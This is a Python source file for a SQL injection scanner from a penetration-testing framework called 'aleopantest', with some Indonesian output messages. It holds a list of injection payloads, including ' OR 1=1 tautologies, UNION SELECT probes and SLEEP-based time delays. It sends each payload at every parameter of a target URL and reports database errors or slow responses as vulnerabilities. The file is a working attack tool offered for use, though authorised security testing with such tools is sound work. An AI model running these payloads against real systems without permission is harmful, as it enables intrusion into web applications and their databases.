"""
SQL Injection Testing Tool

V3.0 Major Patch: Enhanced accuracy, powerful features, and standardized output.
"""
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from aleopantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
from aleopantest.core.logger import logger

class SQLInjector(BaseTool):
    """SQL Injection vulnerability detector with comprehensive payloads"""
    
    def __init__(self):
        metadata = ToolMetadata(
            name="SQL Injection Tester",
            category=ToolCategory.WEB,
            version="3.0.0",
            author="Aleocrophic Team",
            description="SQL injection vulnerability testing dengan berbagai payload untuk mendeteksi celah keamanan pada aplikasi web.",
            usage="aleopantest run sql-injector --url http://target.com/page.php?id=1",
            requirements=["requests"],
            tags=["web", "sql-injection", "vulnerability", "testing"],
            risk_level="HIGH",
            form_schema=[
                {
                    "name": "url",
                    "label": "Target URL",
                    "type": "text",
                    "placeholder": "e.g. http://example.com/search?q=test",
                    "required": True
                },
                {
                    "name": "parameter",
                    "label": "Specific Parameter",
                    "type": "text",
                    "placeholder": "Leave empty to test all parameters",
                    "required": False
                },
                {
                    "name": "method",
                    "label": "HTTP Method",
                    "type": "select",
                    "options": ["GET", "POST"],
                    "default": "GET"
                },
                {
                    "name": "timeout",
                    "label": "Timeout (seconds)",
                    "type": "number",
                    "default": 10,
                    "min": 1,
                    "max": 60
                }
            ] + BaseTool.get_common_form_schema()
        )
        super().__init__(metadata)
        
        # Comprehensive SQL injection payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 'a'='a",
            "') OR ('1'='1",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL, NULL--",
            "1' UNION SELECT NULL, NULL, NULL--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        ]

    def run(self, url: str = "", parameter: str = None, method: str = "GET", timeout: int = 10, **kwargs):
        if not url:
            self.add_error("URL tidak boleh kosong")
            return self.get_results()

        self.audit_log(f"Starting SQL Injection Test: URL={url}, Method={method}")
        self.add_result(f"[*] Mengetes SQL Injection pada {url}...")

        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params and method == "GET":
            self.add_warning("Tidak ada parameter GET yang ditemukan pada URL.")
            return self.get_results()

        target_params = [parameter] if parameter else params.keys()

        for param in target_params:
            self.add_result(f"[*] Mengetes parameter: {param}")
            for payload in self.payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    start_time = time.time()
                    if method == "GET":
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urljoin(url, parsed_url.path) + "?" + new_query
                        response = requests.get(test_url, timeout=timeout)
                    else:
                        response = requests.post(url, data=test_params, timeout=timeout)
                    
                    duration = time.time() - start_time
                    
                    # Error-based detection
                    error_indicators = [
                        'SQL syntax', 'mysql_fetch', 'Warning: MySQL', 'Unclosed quotation mark',
                        'SQL Server', 'ORA-', 'PostgreSQL'
                    ]
                    
                    for indicator in error_indicators:
                        if indicator.lower() in response.text.lower():
                            self.add_result(f"[!] POTENTIAL VULNERABILITY: Parameter '{param}' rentan terhadap SQL Injection!")
                            self.add_result(f"    Payload: {payload}")
                            self.add_result(f"    Indicator: {indicator}")
                            break
                    
                    # Time-based detection
                    if "SLEEP" in payload.upper() and duration >= 5:
                        self.add_result(f"[!] POTENTIAL VULNERABILITY: Parameter '{param}' rentan terhadap Time-Based SQL Injection!")
                        self.add_result(f"    Payload: {payload} (Response time: {round(duration, 2)}s)")

                except requests.exceptions.Timeout:
                    if "SLEEP" in payload.upper():
                        self.add_result(f"[!] POTENTIAL VULNERABILITY: Parameter '{param}' rentan terhadap Time-Based SQL Injection (Timeout)!")
                except Exception as e:
                    logger.debug(f"Error testing payload {payload}: {e}")

        self.add_result("[+] Pengujian SQL Injection selesai.")
        return self.get_results()
